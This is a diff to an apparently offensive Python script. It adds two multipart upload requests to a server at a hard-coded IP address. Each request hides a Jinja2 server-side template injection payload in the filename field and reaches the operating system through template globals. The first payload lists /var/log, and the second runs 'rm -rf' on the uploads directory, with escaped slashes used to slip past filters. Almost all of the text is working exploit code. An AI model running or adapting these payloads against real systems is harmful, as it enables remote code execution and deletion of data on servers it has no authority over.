@@ -125,6 +125,28 @@ Content-Type: text/html
 -----------------------------18136961752888167217815560157--''',
     method="POST", headers={"Content-Type": "multipart/form-data; boundary=---------------------------18136961752888167217815560157", "Cookie": f"token={token}"})), stdout.buffer)
 
+copyfileobj(urlopen(Request(
+    "http://162.19.255.92:1337/upload",
+    data=b'''-----------------------------18136961752888167217815560157
+Content-Disposition: form-data; name="file"; filename="{{ ', '.join(self._TemplateReference__context.cycler.__init__.__globals__.os.listdir('\\x2fvar\\x2flog')) }}"
+Content-Type: text/html
+
+{{ 7 * 7 }}
+
+-----------------------------18136961752888167217815560157--''',
+    method="POST", headers={"Content-Type": "multipart/form-data; boundary=---------------------------18136961752888167217815560157", "Cookie": f"token={token}"})), stdout.buffer)
+
+copyfileobj(urlopen(Request(
+    "http://162.19.255.92:1337/upload",
+    data=b'''-----------------------------18136961752888167217815560157
+Content-Disposition: form-data; name="file"; filename="{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('rm -rf app\\x2fuploads\\x2f*').read() }}"
+Content-Type: text/html
+
+{{ 7 * 7 }}
+
+-----------------------------18136961752888167217815560157--''',
+    method="POST", headers={"Content-Type": "multipart/form-data; boundary=---------------------------18136961752888167217815560157", "Cookie": f"token={token}"})), stdout.buffer)
+
 stdout.flush()
 
 """
